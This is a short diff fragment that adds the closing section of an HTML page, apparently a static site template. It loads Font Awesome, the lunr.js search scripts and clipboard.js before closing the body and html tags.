+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
